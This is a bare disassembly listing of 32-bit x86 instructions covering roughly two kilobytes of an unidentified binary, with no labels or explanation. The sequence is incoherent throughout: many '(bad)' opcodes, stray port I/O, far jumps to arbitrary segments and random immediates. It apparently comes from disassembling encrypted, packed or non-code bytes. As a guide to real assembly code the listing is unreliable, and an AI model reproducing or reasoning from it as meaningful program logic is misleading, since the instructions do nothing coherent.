  425780:	add    DWORD PTR [ecx+0x45],ecx
  425783:	loopne 0x4257e3
  425785:	in     al,dx
  425786:	pop    ds
  425787:	jge    0x4257ec
  425789:	stc    
  42578a:	xchg   dh,bl
  42578c:	jge    0x4257e7
  42578e:	mov    esi,0xb74aab93
  425793:	retf   
  425794:	fisub  WORD PTR [esi+0x343249da]
  42579a:	jmp    0x4257c1
  42579c:	repnz or ebp,DWORD PTR [esi-0x5]
  4257a0:	fwait
  4257a1:	out    0xf,eax
  4257a3:	loop   0x425823
  4257a5:	call   0xcb3af801
  4257aa:	jmp    0x3063575
  4257af:	adc    DWORD PTR [eax+ebp*4-0x73],edi
  4257b3:	mov    dl,0xb6
  4257b5:	(bad)  
  4257b6:	clc    
  4257b7:	mov    ebp,0x27ee976c
  4257bc:	pop    ds
  4257bd:	cli    
  4257be:	dec    esi
  4257bf:	fpatan 
  4257c1:	push   ebp
  4257c2:	sbb    ebx,ebx
  4257c4:	in     al,0x59
  4257c6:	out    dx,eax
  4257c7:	shl    al,0xd5
  4257ca:	pop    es
  4257cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257cc:	sahf   
  4257cd:	push   eax
  4257ce:	jl     0x425823
  4257d0:	pop    esi
  4257d1:	push   edi
  4257d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4257d3:	pop    ebp
  4257d4:	xchg   edx,eax
  4257d5:	pushw  0xffae
  4257d8:	dec    ebx
  4257d9:	jge    0x42581a
  4257db:	pop    edx
  4257dc:	(bad)  
  4257dd:	pusha  
  4257de:	gs mov edx,0xdb75dd7e
  4257e4:	jb     0x4257bb
  4257e6:	out    dx,al
  4257e7:	je     0x4257a0
  4257e9:	fmul   DWORD PTR [ebx+0x5edca29e]
  4257ef:	popf   
  4257f0:	rcl    DWORD PTR [edi],0x69
  4257f3:	pop    edi
  4257f4:	jl     0x425839
  4257f6:	out    dx,al
  4257f7:	jl     0x42580c
  4257f9:	js     0x4257d5
  4257fb:	ret    0xec91
  4257fe:	sub    al,0xa1
  425800:	test   al,0xc4
  425802:	test   BYTE PTR [esi],dl
  425804:	push   ss
  425805:	sti    
  425806:	jmp    0x3b28:0x979b5e0b
  42580d:	gs sahf 
  42580f:	fnsave [ecx-0x685e7342]
  425815:	xchg   esp,eax
  425816:	clc    
  425817:	xor    esp,ebp
  425819:	adc    DWORD PTR [esi],ebp
  42581b:	call   0xa742:0x6d5aef5e
  425822:	popa   
  425823:	xchg   ebp,eax
  425824:	push   cs
  425825:	popa   
  425826:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425827:	shl    BYTE PTR [eax],0xac
  42582a:	clc    
  42582b:	xor    al,0x66
  42582d:	xlat   BYTE PTR ds:[ebx]
  42582e:	out    dx,al
  42582f:	pop    eax
  425830:	es inc esi
  425832:	bound  esp,QWORD PTR [esi]
  425834:	sbb    DWORD PTR [edi+0x4d8fa131],ecx
  42583a:	jb     0x425805
  42583c:	sti    
  42583d:	retf   
  42583e:	test   BYTE PTR [ecx],dl
  425840:	pop    esi
  425841:	cmp    dh,dl
  425843:	(bad)  
  425844:	in     eax,0x52
  425846:	aaa    
  425847:	ret    
  425848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425849:	pusha  
  42584a:	test   eax,0xcbafc002
  42584f:	cdq    
  425850:	mov    ds:0x809dee7b,eax
  425855:	iret   
  425856:	scas   al,BYTE PTR es:[edi]
  425857:	jne    0x4257f8
  425859:	dec    esi
  42585a:	mov    ch,0xa0
  42585c:	in     eax,dx
  42585d:	loope  0x4258c8
  42585f:	push   0x5b
  425861:	and    eax,0x9544e5b3
  425866:	stos   DWORD PTR es:[edi],eax
  425867:	adc    BYTE PTR [esi-0x2a],bl
  42586a:	mov    bh,0xed
  42586c:	mov    ds:0xa4aaae88,eax
  425871:	mov    eax,0x45ce59ee
  425876:	sahf   
  425877:	(bad)
  42587b:	mov    dl,0x25
  42587d:	sbb    al,0xae
  42587f:	lods   al,BYTE PTR ds:[esi]
  425880:	scas   eax,DWORD PTR es:[edi]
  425881:	test   eax,0x64aa19a0
  425886:	inc    ebp
  425887:	mov    edi,0x7a58155e
  42588c:	icebp  
  42588d:	cmp    ebx,DWORD PTR [ebp-0x208da1af]
  425893:	(bad)
  425896:	imul   esp,DWORD PTR [esi-0x4],0x60
  42589a:	cmc    
  42589b:	jmp    0x42588b
  42589d:	inc    ebp
  42589e:	xchg   BYTE PTR [eax+0x77],dh
  4258a1:	jl     0x425891
  4258a3:	clc    
  4258a4:	ins    BYTE PTR es:[edi],dx
  4258a5:	dec    eax
  4258a6:	call   0x35a1:0x93774b4f
  4258ad:	inc    ecx
  4258ae:	xchg   esp,eax
  4258af:	mov    al,BYTE PTR [eax+0x59]
  4258b2:	imul   esi,DWORD PTR [ebx],0x40c2c95e
  4258b8:	xchg   ecx,eax
  4258b9:	and    ebx,ecx
  4258bb:	or     al,0x29
  4258bd:	popa   
  4258be:	std    
  4258bf:	jo     0x4258d1
  4258c1:	push   ecx
  4258c2:	push   ds
  4258c3:	push   ss
  4258c4:	mov    edx,0x8a2eee33
  4258c9:	sbb    ebx,0x50fa8582
  4258cf:	mov    eax,ds:0x5416dd76
  4258d4:	push   ebx
  4258d5:	cmp    BYTE PTR [esi+0x14695e05],dl
  4258db:	sub    DWORD PTR [edi+0x64],edx
  4258de:	pop    ebp
  4258df:	lock ret 0x3360
  4258e3:	sub    ecx,edi
  4258e5:	push   0x46
  4258e7:	push   es
  4258e8:	sbb    ch,0xee
  4258eb:	lds    ebx,FWORD PTR [esp+ecx*4-0x2f1ef4d4]
  4258f2:	stos   BYTE PTR es:[edi],al
  4258f3:	mov    al,ds:0xbe47eef2
  4258f8:	dec    ecx
  4258f9:	xor    ecx,DWORD PTR [eax+ecx*2+0x64]
  4258fd:	add    DWORD PTR [ecx-0x1ea197e9],ecx
  425903:	mov    bl,0x2c
  425905:	leave  
  425906:	int    0x38
  425908:	pop    ebx
  425909:	popa   
  42590a:	popf   
  42590b:	arpl   bp,cx
  42590d:	xchg   ebp,eax
  42590e:	mov    ch,0xcd
  425910:	sbb    eax,0x50d8ee1e
  425915:	ret    
  425916:	mov    esi,0x70bbd6f0
  42591c:	jne    0x42597e
  42591e:	sbb    DWORD PTR [eax],0xfffffff3
  425921:	std    
  425922:	mov    ds:0x25b97f6e,eax
  425927:	stos   BYTE PTR es:[edi],al
  425928:	add    eax,0x524913f9
  42592d:	inc    DWORD PTR [eax+0x33c09e2d]
  425933:	mov    al,ds:0xa2813431
  425938:	cdq    
  425939:	xor    DWORD PTR [ebp+edx*4+0x69],0xa85d6357
  425941:	cmc    
  425942:	out    0x87,eax
  425944:	push   eax
  425945:	cmp    bl,BYTE PTR [edi+0x3c8fcf56]
  42594b:	add    esi,0x646b30df
  425951:	adc    eax,0x3d5ede04
  425956:	mov    dh,0x4c
  425958:	test   DWORD PTR [esi+0x44ee6522],edx
  42595e:	push   DWORD PTR [ecx-0x55]
  425961:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425962:	pusha  
  425963:	mov    eax,ds:0xaefc09e3
  425968:	xor    BYTE PTR [eax+ecx*1-0x5f],ah
  42596c:	loopne 0x4258f4
  42596e:	mov    ds:0x7aa0b9ee,al
  425973:	out    0x54,al
  425975:	popf   
  425976:	(bad)  
  425977:	outs   dx,DWORD PTR ds:[esi]
  425978:	pop    esi
  425979:	jecxz  0x42590d
  42597b:	pusha  
  42597c:	rcl    DWORD PTR [eax+0x7af7a155],1
  425982:	mov    ds:0x6e62719c,eax
  425987:	mov    DWORD PTR [esi+0x3],ebx
  42598a:	fsubr  DWORD PTR [ecx]
  42598c:	ins    BYTE PTR es:[edi],dx
  42598d:	mov    ebx,0x4389740b
  425992:	fidiv  DWORD PTR [ebx]
  425994:	push   0xffffffe0
  425996:	adc    eax,DWORD PTR [esi-0x7]
  425999:	sub    esp,esp
  42599b:	ds pop esi
  42599d:	mov    esi,0xe9ffa8f1
  4259a2:	jae    0x42599d
  4259a4:	out    dx,eax
  4259a5:	mov    dl,0x22
  4259a7:	mov    ds:0xa57ed478,al
  4259ac:	mov    cl,0x56
  4259ae:	pop    edi
  4259af:	and    esi,DWORD PTR [esi+0x6aa21e4f]
  4259b5:	inc    eax
  4259b6:	or     DWORD PTR [edi+edi*8],0xffffffb2
  4259ba:	pop    ebx
  4259bb:	mov    eax,ds:0x27c01a5c
  4259c0:	add    eax,0x5e22a3fb
  4259c5:	aam    0x9f
  4259c7:	sub    edi,DWORD PTR [esi]
  4259c9:	xor    edi,DWORD PTR [edi-0x7d]
  4259cc:	add    DWORD PTR [ebx-0x1a],0xffffffbd
  4259d0:	es ret 
  4259d2:	jp     0x4259f5
  4259d4:	int3   
  4259d5:	scas   eax,DWORD PTR es:[edi]
  4259d6:	sub    eax,0xee9d8bf5
  4259db:	mov    eax,0x6562265a
  4259e0:	jmp    0x4259e5
  4259e2:	sahf   
  4259e3:	mov    eax,ds:0x22061208
  4259e8:	add    al,0xe1
  4259ea:	pushf  
  4259eb:	icebp  
  4259ec:	pop    ebp
  4259ed:	ficomp WORD PTR [edi-0x5aa75388]
  4259f3:	jecxz  0x425987
  4259f5:	and    dh,BYTE PTR [eax+eiz*4+0x210fd781]
  4259fc:	xchg   ecx,eax
  4259fd:	adc    ebx,DWORD PTR [ebp+0x64]
  425a00:	pop    esi
  425a01:	cmp    eax,0x89191879
  425a06:	int    0x88
  425a08:	or     esp,DWORD PTR [ecx+0x72]
  425a0b:	jl     0x4259fc
  425a0d:	les    ecx,FWORD PTR [esi+0x53]
  425a10:	or     BYTE PTR [eax-0x68d39c17],ah
  425a16:	cmp    eax,0xc2bdeb5
  425a1b:	mov    dh,bl
  425a1d:	pusha  
  425a1e:	sub    al,0x15
  425a20:	out    dx,al
  425a21:	leave  
  425a22:	xchg   bh,ch
  425a24:	jno    0x4259fb
  425a26:	adc    BYTE PTR [eax-0x5e],dl
  425a29:	mov    eax,0x2c5d9016
  425a2e:	shr    BYTE PTR [ecx+0x3b],0xf2
  425a32:	hlt    
  425a33:	aam    0xa2
  425a35:	in     eax,dx
  425a36:	shl    DWORD PTR [eax+0x73d578ec],1
  425a3c:	add    bh,BYTE PTR [edi+0x4a5e7ea6]
  425a42:	das    
  425a43:	or     ch,BYTE PTR [edx-0x160ffd59]
  425a49:	pop    ecx
  425a4a:	dec    DWORD PTR [ebx+ebp*1+0x5e]
  425a4e:	adc    cl,ah
  425a50:	adc    BYTE PTR [ecx],cl
  425a52:	nop
  425a53:	sbb    al,0x5e
  425a55:	and    ebx,DWORD PTR [ebx]
  425a57:	dec    edx
  425a58:	dec    eax
  425a59:	xor    eax,0x61394fd1
  425a5e:	jo     0x425a61
  425a60:	bound  edx,QWORD PTR [eax]
  425a62:	cmp    al,0xe6
  425a64:	mov    ebp,0x321bee82
  425a69:	xchg   ebx,eax
  425a6a:	jno    0x425a0a
  425a6c:	pop    ecx
  425a6d:	ins    BYTE PTR es:[edi],dx
  425a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425a6f:	mov    eax,ds:0xe826884b
  425a74:	pop    ss
  425a75:	pop    ecx
  425a76:	sub    al,cl
  425a78:	pop    ebp
  425a79:	jmp    0x57e599b1
  425a7e:	cld    
  425a7f:	(bad)  
  425a80:	jle    0x425a63
  425a82:	pushf  
  425a83:	mov    eax,ds:0x2d8b1392
  425a88:	fsubr  DWORD PTR [edx+0x655e5626]
  425a8e:	loopne 0x425b03
  425a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a91:	sbb    ebx,0xffffff97
  425a94:	mov    eax,0x16a132c8
  425a99:	mov    bl,BYTE PTR [ebp+0x30d6c7b2]
  425a9f:	(bad)  
  425aa0:	arpl   bx,bp
  425aa2:	mov    cl,0x0
  425aa4:	repnz add BYTE PTR [edi],bl
  425aa7:	lea    eax,[ebx]
  425aa9:	mov    esp,0x7ba1a134
  425aae:	test   eax,0xd3d541fe
  425ab3:	push   esi
  425ab4:	lock pop ebp
  425ab6:	out    dx,al
  425ab7:	adc    eax,0xabc4e530
  425abc:	iret   
  425abd:	rol    DWORD PTR [ecx-0x11f99127],cl
  425ac3:	retf   
  425ac4:	out    0x1c,eax
  425ac6:	dec    esp
  425ac7:	not    DWORD PTR ds:0xb81aee96
  425acd:	out    dx,al
  425ace:	add    DWORD PTR [eax-0x71fc32f6],edx
  425ad4:	inc    edi
  425ad5:	mov    cs,WORD PTR [esi]
  425ad7:	mov    eax,ds:0x72280105
  425adc:	enter  0xde51,0xdb
  425ae0:	pop    ebp
  425ae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ae2:	sar    DWORD PTR [ebp-0x59],1
  425ae5:	mov    eax,ds:0xc83ef2b0
  425aea:	mov    ds:0xc59b53a1,al
  425aef:	stc    
  425af0:	fild   DWORD PTR [edi-0x3b9ff974]
  425af6:	test   DWORD PTR [edx+0x8],esi
  425af9:	clc    
  425afa:	pop    edi
  425afb:	loope  0x425acd
  425afd:	xchg   edx,eax
  425afe:	sub    eax,0xdf60a185
  425b03:	js     0x425a93
  425b05:	(bad)  
  425b06:	int3   
  425b07:	and    al,0xc1
  425b09:	iret   
  425b0a:	out    0xee,eax
  425b0c:	mov    al,ds:0x1354411b
  425b11:	fisub  WORD PTR [ebp+0x5eda45fb]
  425b17:	and    ecx,DWORD PTR [ebx-0xc644553]
  425b1d:	test   al,0xac
  425b1f:	scas   al,BYTE PTR es:[edi]
  425b20:	fisubr WORD PTR ds:0x782c785f
  425b26:	out    0xfa,eax
  425b28:	lahf   
  425b29:	shl    edx,1
  425b2b:	imul   ebx,DWORD PTR [esi],0xffffffd7
  425b2e:	fist   WORD PTR [edi-0x7b]
  425b31:	pusha  
  425b32:	pop    eax
  425b33:	mov    ch,0x83
  425b35:	add    BYTE PTR [edi-0x1c],cl
  425b38:	daa    
  425b39:	leave  
  425b3a:	out    dx,al
  425b3b:	dec    ebp
  425b3c:	cli    
  425b3d:	(bad)  
  425b3f:	inc    edx
  425b40:	fistp  WORD PTR [ebp-0x1f]
  425b43:	mov    al,ds:0x7fcd8e4d
  425b48:	or     BYTE PTR [ebx-0x6a],bh
  425b4b:	pop    ds
  425b4c:	pop    esi
  425b4d:	(bad)  
  425b4e:	and    edx,esi
  425b50:	out    dx,al
  425b51:	jge    0x425b05
  425b53:	outs   dx,DWORD PTR ds:[esi]
  425b54:	cs popa 
  425b56:	retf   
  425b57:	js     0x425b37
  425b59:	jmp    0xb8486b75
  425b5e:	out    dx,al
  425b5f:	dec    ecx
  425b60:	push   ecx
  425b61:	mul    BYTE PTR [esp+edx*2-0x5f2b4477]
  425b68:	sub    bh,BYTE PTR [ebx+0x4c]
  425b6b:	jae    0x425b7a
  425b6d:	xlat   BYTE PTR cs:[ebx]
  425b6f:	or     eax,0x29541d78
  425b74:	or     BYTE PTR [eax-0x32],0xc3
  425b78:	jo     0x425afb
  425b7a:	les    ebp,FWORD PTR [esi-0xb48b293]
  425b80:	sub    eax,0x8e19eea6
  425b85:	shl    BYTE PTR [esi],1
  425b87:	pop    esp
  425b88:	jb     0x425bea
  425b8a:	(bad)  
  425b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b8c:	and    al,0x10
  425b8e:	add    eax,0xeeee2cb8
  425b93:	xchg   DWORD PTR [ecx],edx
  425b95:	(bad)  
  425b96:	fild   DWORD PTR [esi]
  425b98:	jne    0x425b69
  425b9a:	sbb    al,0xa1
  425b9c:	mov    ds:0x9af56745,al
  425ba1:	das    
  425ba2:	push   ebx
  425ba3:	mov    ebx,0x1660925e
  425ba8:	(bad)  [edx]
  425baa:	fbld   TBYTE PTR [esi-0x146aadcf]
  425bb0:	loopne 0x425bf4
  425bb2:	lea    ebp,[eax+0x515e997a]
  425bb8:	fs xchg esp,eax
  425bba:	fisttp QWORD PTR [eax-0x406995b0]
  425bc0:	pop    esi
  425bc1:	cmp    DWORD PTR [edi],ebp
  425bc3:	aas    
  425bc4:	push   ecx
  425bc5:	mov    ds:0x612884af,eax
  425bca:	cs push ebx
  425bcc:	aam    0xdd
  425bce:	in     al,dx
  425bcf:	sbb    eax,0x54ee97b5
  425bd4:	xchg   ecx,eax
  425bd5:	call   DWORD PTR [esi+0x44f23ca9]
  425bdb:	xchg   ebx,eax
  425bdc:	pushf  
  425bdd:	mov    ds:0x20c18e43,al
  425be2:	sahf   
  425be3:	scas   eax,DWORD PTR es:[edi]
  425be4:	xchg   esp,edi
  425be6:	fwait
  425be7:	ins    BYTE PTR es:[edi],dx
  425be8:	pop    esi
  425be9:	shl    DWORD PTR [esi],0xd4
  425bec:	jnp    0x425c12
  425bee:	xchg   ebx,eax
  425bef:	es dec ebx
  425bf1:	pop    esi
  425bf2:	dec    bl
  425bf4:	pop    esp
  425bf5:	push   esi
  425bf6:	enterw 0x99ae,0x28
  425bfb:	mov    ebx,0x5fd77d65
  425c00:	retf   0x6e23
  425c03:	push   ds
  425c04:	icebp  
  425c05:	pop    edx
  425c06:	cmp    ebx,DWORD PTR [edi+0x32]
  425c09:	xchg   edi,eax
  425c0a:	(bad)  
  425c0b:	jae    0x425c70
  425c0d:	inc    esi
  425c0e:	or     eax,eax
  425c10:	popf   
  425c11:	inc    eax
  425c12:	inc    ebp
  425c13:	fdivr  QWORD PTR [ebp-0x7f]
  425c16:	push   ebx
  425c17:	out    dx,eax
  425c18:	dec    esp
  425c19:	popa   
  425c1a:	cmc    
  425c1b:	fxch   st(6)
  425c1d:	cmp    eax,0xddf9792f
  425c22:	out    dx,al
  425c23:	aaa    
  425c24:	test   eax,0x46f99daa
  425c29:	cdq    
  425c2a:	cwde   
  425c2b:	mov    eax,ds:0x13b00e03
  425c30:	cmp    eax,0x4bf6f66e
  425c35:	fldcw  WORD PTR [edx+0x29]
  425c38:	jae    0x425c9a
  425c3a:	or     BYTE PTR [edi-0x9e28da9],bl
  425c40:	jmp    0x2424:0x685aee9a
  425c47:	adc    DWORD PTR [ebx+0x4b],esp
  425c4a:	mov    ah,BYTE PTR [ecx+0x25470219]
  425c50:	push   0x13
  425c52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c53:	daa    
  425c54:	pop    esi
  425c55:	outs   dx,BYTE PTR ds:[esi]
  425c56:	cmp    BYTE PTR [eax+0x746bc7b9],0x81
  425c5d:	pusha  
  425c5e:	and    esp,DWORD PTR [ebp+0x915d589]
  425c64:	not    edx
  425c66:	out    dx,al
  425c67:	bound  ebx,QWORD PTR [edx+eiz*4+0x3a]
  425c6b:	test   al,0xe5
  425c6d:	mov    DWORD PTR [edi-0x5f],ecx
  425c70:	scas   eax,DWORD PTR es:[edi]
  425c71:	out    dx,al
  425c72:	loope  0x425c39
  425c74:	gs enter 0x9c9d,0x5e
  425c79:	xor    BYTE PTR [ebp+0x59],ah
  425c7c:	out    dx,al
  425c7d:	les    ebp,FWORD PTR [eax]
  425c7f:	pop    ebx
  425c80:	outs   dx,BYTE PTR ds:[esi]
  425c81:	pusha  
  425c82:	jmp    0xd4f135e
  425c87:	inc    ecx
  425c88:	cwde   
  425c89:	push   eax
  425c8a:	out    0xe7,eax
  425c8c:	and    eax,0xaefb29a9
  425c91:	xlat   BYTE PTR ds:[ebx]
  425c92:	sar    BYTE PTR [esi-0x1615a679],cl
  425c98:	jae    0x425ca6
  425c9a:	mov    esi,ecx
  425c9c:	inc    ecx
  425c9d:	bound  ebp,QWORD PTR [esi]
  425c9f:	(bad)  
  425ca0:	pop    ebp
  425ca1:	pop    es
  425ca2:	test   BYTE PTR [edi],dl
  425ca4:	pop    ebp
  425ca5:	and    al,0xcb
  425ca7:	jl     0x425ca7
  425ca9:	sub    BYTE PTR [esi],ah
  425cab:	mov    eax,ds:0xd78ed749
  425cb0:	out    dx,al
  425cb1:	mov    bh,0x2e
  425cb3:	sub    bl,BYTE PTR [esi-0x4c]
  425cb6:	mov    bl,0x92
  425cb8:	or     ecx,edx
  425cba:	xlat   BYTE PTR ds:[ebx]
  425cbb:	icebp  
  425cbc:	lds    ebx,FWORD PTR [ecx+0xb]
  425cbf:	mov    eax,0x71a69aa4
  425cc4:	loopne 0x425d0c
  425cc6:	arpl   si,sp
  425cc8:	pop    esi
  425cc9:	dec    ebx
  425cca:	add    eax,0x3e2efd9b
  425ccf:	adc    ebx,DWORD PTR [ebx+0x61]
  425cd2:	mov    DWORD PTR [eax],esi
  425cd4:	(bad)  
  425cd5:	and    esi,DWORD PTR [edx+ebx*1-0x7e]
  425cd9:	cmp    al,0xef
  425cdb:	fs loope 0x425d44
  425cde:	dec    edx
  425cdf:	or     DWORD PTR [edi+0x4a6f06c4],0x64e4b561
  425ce9:	jne    0x425c85
  425ceb:	jno    0x425d04
  425ced:	(bad)  
  425cee:	jmp    0x425cc0
  425cf0:	sub    ebx,ebx
  425cf2:	push   ds
  425cf3:	push   ecx
  425cf4:	jge    0x425cce
  425cf6:	mov    ebx,0x88b4d303
  425cfb:	test   al,0x7a
  425cfd:	pop    es
  425cfe:	and    DWORD PTR [eax],ebp
  425d00:	jbe    0x425d02
  425d02:	or     ah,BYTE PTR [ebx]
  425d04:	sbb    DWORD PTR [edi],ebp
  425d06:	out    dx,al
  425d07:	jle    0x425ce7
  425d09:	dec    ebx
  425d0a:	ret    0xf17c
  425d0d:	cmc    
  425d0e:	push   ebp
  425d0f:	mov    eax,ds:0xe09c8fb1
  425d14:	and    al,cl
  425d16:	dec    eax
  425d17:	mov    al,ds:0x1ceec272
  425d1c:	int    0x46
  425d1e:	jne    0x425d70
  425d20:	jp     0x425d9e
  425d22:	pop    esp
  425d23:	mov    ds:0xfa3a7240,al
  425d28:	data16 je 0x425ce6
  425d2b:	rcl    BYTE PTR [edi-0x15],0xec
  425d2f:	xlat   BYTE PTR ds:[ebx]
  425d30:	fs mov al,0xed
  425d33:	adc    DWORD PTR [esi+ebx*4],esp
  425d36:	fld    DWORD PTR [eax+0x7e]
  425d39:	call   DWORD PTR [edx+0x63aa7da1]
  425d3f:	sub    eax,0x364177d0
  425d44:	pop    esi
  425d45:	mov    ebp,gs
  425d47:	inc    ebx
  425d48:	retf   0x60a4
  425d4b:	xchg   BYTE PTR [ebp+0x54399b60],dl
  425d51:	xchg   ebx,eax
  425d52:	je     0x425d18
  425d54:	in     al,0x8
  425d56:	bound  eax,QWORD PTR [eax]
  425d58:	arpl   WORD PTR [ebx],bp
  425d5a:	inc    edx
  425d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d5c:	leave  
  425d5d:	cmp    eax,0x91261a1c
  425d62:	xchg   esp,eax
  425d63:	in     al,dx
  425d64:	int    0x60
  425d66:	ficomp WORD PTR ds:0x6cffc0a9
  425d6c:	shr    DWORD PTR [ebp-0x12],cl
  425d6f:	popf   
  425d70:	xchg   esi,eax
  425d71:	push   cs
  425d72:	mov    ch,BYTE PTR fs:[esi-0x62]
  425d76:	and    ah,BYTE PTR [ecx-0x7e183ada]
  425d7c:	and    DWORD PTR [ecx],edi
  425d7e:	inc    edi
  425d7f:	jmp    0x425ddc
  425d81:	out    0x67,eax
  425d83:	sbb    eax,0xd1fe35ff
  425d88:	pushf  
  425d89:	fadd   QWORD PTR [eax-0x67a94b60]
  425d8f:	pop    ebp
  425d90:	jle    0x425d15
  425d92:	sub    DWORD PTR [ebp+0x8],esi
  425d95:	push   esp
  425d96:	out    dx,al
  425d97:	adc    al,BYTE PTR [eax+0x40224744]
  425d9d:	adc    dl,cl
  425d9f:	mov    gs,WORD PTR [edx]
  425da1:	pop    esp
  425da2:	ja     0x425dfe
  425da4:	es gs out dx,al
  425da7:	and    eax,0x72bcc530
  425dac:	push   edx
  425dad:	jmp    0xec08:0x87db6023
  425db4:	ficomp WORD PTR [eax+edx*8+0x2d5a332e]
  425dbb:	or     eax,0x218844f5
  425dc0:	jns    0x425daa
  425dc2:	dec    ebp
  425dc3:	and    al,0x67
  425dc5:	sub    bh,BYTE PTR [ebx+0x15573eb4]
  425dcb:	sbb    BYTE PTR [esi+0x7e],bl
  425dce:	jl     0x425dad
  425dd0:	loope  0x425e43
  425dd2:	sbb    BYTE PTR [ecx+0x6121b936],ah
  425dd8:	lahf   
  425dd9:	xchg   ebx,eax
  425dda:	out    0x37,eax
  425ddc:	pusha  
  425ddd:	fist   WORD PTR [eax-0x4d]
  425de0:	add    BYTE PTR [esi+0x61],ch
  425de3:	sub    BYTE PTR [edi-0x35b4b2f6],ch
  425de9:	cld    
  425dea:	pop    edx
  425deb:	mov    ds:0x4c95611a,eax
  425df0:	add    dl,cl
  425df2:	pop    ebx
  425df3:	dec    eax
  425df4:	out    0xe6,eax
  425df6:	out    dx,al
  425df7:	lods   eax,DWORD PTR ds:[esi]
  425df8:	mov    DWORD PTR [ecx-0x67],ecx
  425dfb:	daa    
  425dfc:	retf   
  425dfd:	sbb    ah,BYTE PTR [ecx+eiz*4-0x1a]
  425e01:	mov    ds:0x3d8d3fdc,al
  425e06:	inc    edx
  425e07:	in     al,0x5e
  425e09:	sbb    eax,0xa116914
  425e0e:	out    dx,eax
  425e0f:	test   edi,ecx
  425e11:	pop    esi
  425e12:	int3   
  425e13:	rol    DWORD PTR [ebx-0x2],cl
  425e16:	adc    esi,DWORD PTR [edx]
  425e18:	(bad)  
  425e19:	fbld   TBYTE PTR [ebp+0x2f]
  425e1c:	ss pop esp
  425e1e:	cmp    eax,0x1b544920
  425e23:	adc    DWORD PTR [edi+0x1825de38],0x9ab9ce61
  425e2d:	(bad)  
  425e2e:	shl    BYTE PTR [ecx-0x30],cl
  425e31:	pmaxsw mm4,QWORD PTR [ecx]
  425e34:	fwait
  425e35:	or     al,0x48
  425e37:	mov    edx,esi
  425e39:	dec    esi
  425e3a:	mov    eax,gs:0x2d9aee47
  425e40:	sub    esi,DWORD PTR cs:[esi-0x114393d3]
  425e47:	in     al,0xa2
  425e49:	or     eax,0xeb6aeeb1
  425e4e:	or     ah,BYTE PTR [edx+0x5391013f]
  425e54:	pop    edx
  425e55:	outs   dx,DWORD PTR ds:[esi]
  425e56:	ss imul ecx,DWORD PTR gs:[edi+0x5a],0xffffffd8
  425e5c:	pop    esi
  425e5d:	mov    al,0x69
  425e5f:	sbb    dh,BYTE PTR [ecx]
  425e61:	sbb    BYTE PTR [ecx],dl
  425e63:	outs   dx,DWORD PTR ds:[esi]
  425e64:	mov    edx,0xf894de2b
  425e69:	(bad)  
  425e6a:	fdivr  DWORD PTR [ecx+0x5d]
  425e6d:	retf   0x7a0b
  425e70:	pop    es
  425e71:	stc    
  425e72:	les    esi,FWORD PTR [ebp+eax*1-0x78]
  425e76:	out    0xb9,eax
  425e78:	xor    al,0x4
  425e7a:	sub    edi,DWORD PTR [eax+0x2e]
  425e7d:	cmp    al,0xed
  425e7f:	hlt    
  425e80:	and    al,0xb9
  425e82:	(bad)  
  425e83:	enter  0x7e72,0xee
  425e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e88:	mov    ds:0xa2a93a07,eax
  425e8d:	fcomi  st,st(0)
  425e8f:	cmp    eax,0xa137b179
  425e94:	jmp    0x2d61:0x14a0012e
  425e9b:	and    ah,ah
  425e9d:	push   ebp
  425e9e:	fidiv  WORD PTR [bp+si]
  425ea1:	sbb    bl,bl
  425ea3:	call   FWORD PTR [ebp-0x1b]
  425ea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ea7:	mov    ecx,0x86da6d51
  425eac:	jb     0x425efa
  425eae:	daa    
  425eaf:	stos   DWORD PTR es:[edi],eax
  425eb0:	into   
  425eb1:	xor    ebp,esi
  425eb3:	jg     0x425f14
  425eb5:	mov    al,0xa9
  425eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425eb8:	adc    DWORD PTR [ebp+0xa],ebx
  425ebb:	inc    ebp
  425ebc:	and    DWORD PTR [ecx+0x371a9a22],eax
  425ec2:	cdq    
  425ec3:	mov    eax,ds:0xfd2739a5
  425ec8:	jmp    0x425f1f
  425eca:	gs test al,0x2d
  425ecd:	scas   al,BYTE PTR es:[edi]
  425ece:	mov    esi,0x3ffe5e98
  425ed3:	popa   
  425ed4:	rcr    DWORD PTR [edx+0x6d],cl
  425ed7:	and    ebp,DWORD PTR [esi+0x72]
  425eda:	loopne 0x425ec9
  425edc:	daa    
  425edd:	popa   
  425ede:	push   esp
  425edf:	jl     0x425f4e
  425ee1:	push   edi
  425ee2:	in     eax,dx
  425ee3:	sbb    eax,0x8966345e
  425ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ee9:	pop    ebp
  425eea:	fs pop ebp
  425eec:	inc    ecx
  425eed:	pop    esi
  425eee:	loope  0x425e72
  425ef0:	push   ebp
  425ef1:	loop   0x425f07
  425ef3:	dec    ebx
  425ef4:	jle    0x425ec4
  425ef6:	(bad)  
  425ef8:	pop    esi
  425ef9:	mov    edi,edi
  425efb:	sar    bh,cl
  425efd:	sahf   
  425efe:	xchg   ebx,eax
  425eff:	pop    es
  425f00:	cs popa 
  425f02:	dec    edx
  425f03:	ret    
  425f04:	sub    BYTE PTR [esi+0x57],ah
  425f07:	jl     0x425f45
  425f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425f0a:	xlat   BYTE PTR ds:[ebx]
  425f0b:	mov    ds,WORD PTR [ecx-0x4]
  425f0e:	add    al,0x68
  425f10:	inc    ebx
  425f11:	arpl   WORD PTR [esi],bp
  425f13:	(bad)
  425f16:	cmp    esp,DWORD PTR [ecx+0x4a758e6a]
  425f1c:	iret   
  425f1d:	push   ebx
  425f1e:	pop    edi
  425f1f:	rcr    BYTE PTR [esi-0x1b],cl
